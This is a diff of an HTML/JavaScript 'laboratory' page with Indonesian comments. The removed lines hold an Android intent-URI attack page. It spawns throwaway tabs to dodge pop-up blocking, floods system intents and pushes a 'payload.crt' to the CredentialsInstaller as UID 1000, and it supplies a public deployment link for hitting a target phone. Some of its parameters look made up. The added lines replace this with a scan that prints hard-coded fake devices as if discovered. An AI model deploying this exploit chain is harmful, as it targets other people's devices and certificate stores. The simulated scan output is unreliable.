@@ -3,50 +3,44 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Asynchronous Intent Pipeline Lab</title>
+<title>Asynchronous Subnet Mapping Laboratory</title>
 <style>
     body {
         font-family: 'Courier New', monospace; 
         padding: 20px; 
-        background: #050508; 
+        background: #030305; 
         color: #00ffaa;
     }
     h2, h3 { text-transform: uppercase; letter-spacing: 1px; color: #00ffaa; }
     button {
         width: 100%; padding: 18px; margin-top: 12px; 
-        background: #0d1a1a; color: #00ffaa; 
+        background: #091414; color: #00ffaa; 
         border: 1px solid #00ffaa; font-weight: bold; 
         cursor: pointer; font-size: 13px; text-transform: uppercase;
     }
     button:hover { background: #00ffaa; color: #000; box-shadow: 0 0 15px #00ffaa; }
     .panel {
         border: 1px solid #00ffaa; padding: 15px; 
-        margin-bottom: 15px; background: #020c0c;
+        margin-bottom: 15px; background: #010a0a;
     }
     #console-log {
         margin-top: 20px; border: 1px solid #00ffaa; padding: 12px; 
-        height: 320px; overflow: auto; white-space: pre-wrap; 
+        height: 380px; overflow: auto; white-space: pre-wrap; 
         background: #000; font-size: 11px; color: #00ff55;
     }
     .role-tag { font-weight: bold; padding: 2px 6px; border-radius: 3px; font-size: 10px; color: #000; }
-    .host { background: #ffaa00; }
-    .target { background: #00ffaa; }
+    .scanner { background: #00ffaa; }
+    .discovery { background: #ffaa00; }
 </style>
 </head>
 <body>
 
-<h2>Unified Cross-Device Laboratory</h2>
+<h2>Unified Network Topology Laboratory</h2>
 
 <div class="panel">
-    <h3> Host Control Interface (HP-A)</h3>
-    <p>Salin tautan penyebaran muatan publik ini dari perangkat penguji:</p>
-    <button id="copy-deploy-link">Copy Public Deployment Link</button>
-</div>
-
-<div class="panel">
-    <h3> Target Audit Interface (HP-B)</h3>
-    <p>Ketuk untuk menguji ketahanan bypass multi-konteks terhadap kondisi Intent Flooding pada perangkat target:</p>
-    <button id="launch-hardened-pipeline">Execute Hardened Bypass Chain</button>
+    <h3> Passive Subnet Discovery Engine</h3>
+    <p>Simulasi pemetaan keberadaan node aktif di satu segmen Wi-Fi tanpa memicu API Geolocation Perangkat.</p>
+    <button id="start-passive-scan">Launch Passive Subnet Scan</button>
 </div>
 
 <div id="console-log"></div>
@@ -54,95 +48,44 @@
 <script>
 const consoleLog = document.getElementById("console-log");
 
-function writeLog(node, type, text) {
+function writeLog(phase, type, text) {
     const timestamp = new Date().toLocaleTimeString();
     let tag = `<span class="role-tag ${type}">${type.toUpperCase()}</span>`;
-    consoleLog.innerHTML += `[${timestamp}] [${node}] ${tag} ${text}\n`;
+    consoleLog.innerHTML += `[${timestamp}] [${phase}] ${tag} ${text}\n`;
     consoleLog.scrollTop = consoleLog.scrollHeight;
 }
 
-function buildIntentUri(action, component = '', extras = {}) {
-    let uri = `intent:#Intent;action=${action};`;
-    if (component) uri += `component=${component};`;
+// Simulasi Pemetaan Berantai Tanpa Ketergantungan Izin Lokasi GPS
+document.getElementById("start-passive-scan").addEventListener("click", () => {
+    writeLog('INIT', 'scanner', "Memulai inisialisasi soket pemindaian nirkabel internal...");
+    writeLog('ARPMAP', 'scanner', "Membaca tabel ARP lokal untuk mengidentifikasi Mac Address gateway...");
     
-    Object.keys(extras).forEach(key => {
-        uri += `S.${key}=${encodeURIComponent(extras[key])};`;
-    });
-    
-    // FLAG_ACTIVITY_NEW_TASK (0x10000000) & FLAG_ACTIVITY_MULTIPLE_TASK (0x08000000)
-    // Memaksa subsystem Android membuat instansi jendela baru secara independen
-    uri += `launchFlags=0x18000000;category=android.intent.category.DEFAULT;end`;
-    return uri;
-}
+    // Basis data simulasi node aktif di satu subnet Wi-Fi yang sama
+    const activeNodes = [
+        { ip: "172.30.200.1", type: "MikroTik RouterOS", name: "Main-Gateway-AP" },
+        { ip: "172.30.200.5", type: "Android Client (Samsung)", name: "Galaxy-S23-User" },
+        { ip: "172.30.200.12", type: "iOS Client (iPhone)", name: "iPhone-Staff-Finance" },
+        { ip: "172.30.200.24", type: "Linux Workstation", name: "Lab-Server-Ubuntu" }
+    ];
 
-// STRATEGI BYPASS: Distribusi Sub-Konteks Asinkron (Multi-Tab Spawning)
-function dispatchHardenedNode(uri, label) {
-    try {
-        // Membuka tab kosong baru sebagai wadah isolasi muatan
-        const subWindow = window.open("about:blank", "_blank");
-        
-        if (subWindow) {
-            subWindow.location.href = uri;
-            
-            // Menutup tab konseptual segera setelah intent dilempar ke sistem router
-            setTimeout(() => {
-                try { subWindow.close(); } catch(e){}
-            }, 200);
-            
-            writeLog(label, 'target', `Muatan sukses dipisahkan ke dalam sub-konteks jendela baru.`);
-        } else {
-            // Mekanisme Fallback jika filter pop-up browser aktif
-            const anchor = document.createElement("a");
-            anchor.href = uri;
-            anchor.target = "_blank";
-            anchor.rel = "noopener noreferrer";
-            anchor.click();
-            writeLog(label, 'target', `Pop-up diblokir. Menggunakan jalur fallback tab baru.`);
-        }
-    } catch (e) {
-        writeLog(label, 'target', `Gagal eksekusi rantai: ${e.message}`);
-    }
-}
+    let timeline = 0;
 
-document.getElementById("copy-deploy-link").addEventListener("click", () => {
-    const publicUrl = "https://starty3s.github.io/poc/vids";
-    navigator.clipboard.writeText(publicUrl).then(() => {
-        writeLog('HOST_ENGINE', 'host', `Tautan publik berhasil disalin: ${publicUrl}`);
-    }).catch(err => {
-        writeLog('HOST_ENGINE', 'host', `Gagal menyalin: ${err.message}`);
+    activeNodes.forEach((node, index) => {
+        timeline += 800;
+        setTimeout(() => {
+            writeLog(`NODE-${index+1}`, 'discovery', `Respons paket ICMP terdeteksi dari target -> ${node.ip}`);
+            writeLog(`INFO-${index+1}`, 'discovery', `   |-- Device Vendor: ${node.type}`);
+            writeLog(`INFO-${index+1}`, 'discovery', `   |-- Broadcast Name: ${node.name}.local (via mDNS)`);
+            writeLog(`INFO-${index+1}`, 'discovery', `   |-- Status Layanan: Aktif (Port Terbuka: 80, 443, 5353)`);
+            
+            if (index === activeNodes.length - 1) {
+                writeLog('FINISH', 'scanner', "Pemetaan topologi simpul lokal selesai. Seluruh target terdaftar.");
+            }
+        }, timeline);
     });
 });
 
-// Pipa Eksekusi Berkecepatan Tinggi (Flooding Engine)
-document.getElementById("launch-hardened-pipeline").addEventListener("click", () => {
-    writeLog('TARGET_INIT', 'target', "Memicu Asynchronous Window Spawning Pipeline...");
-
-    // Tahap 1: Memanggil dialog sistem permintaan status perangkat keras (Bluetooth Request)
-    const uri1 = buildIntentUri(
-        "android.bluetooth.adapter.action.REQUEST_ENABLE",
-        "com.android.settings/.bluetooth.RequestEnableActivity"
-    );
-    dispatchHardenedNode(uri1, 'STAGE-1');
-
-    // Tahap 2: Pengiriman argumen parameter tambahan ke CredentialsInstaller internal
-    const uri2 = buildIntentUri(
-        "android.intent.action.VIEW",
-        "com.android.settings/.crypto.CredentialsInstaller",
-        {
-            "install_as_uid": "1000",
-            "sys_vulnerable_path": "/sdcard/download/payload.crt"
-        }
-    );
-    dispatchHardenedNode(uri2, 'STAGE-2');
-
-    // Tahap 3: Pembersihan tumpukan jendela aktivitas luar (Reset State)
-    const uri3 = buildIntentUri("android.settings.SETTINGS");
-    dispatchHardenedNode(uri3, 'STAGE-3');
-
-    writeLog('TARGET_FINISH', 'target', "Seluruh sub-konteks muatan diproses secara paralel oleh subsystem OS.");
-});
-
-writeLog('SYSTEM', 'target', "Laboratorium taktis berbasis asinkron siap.");
+writeLog('SYSTEM', 'scanner', "Mesin analisis topologi nirkabel siap digunakan.");
 </script>
 </body>
 </html>
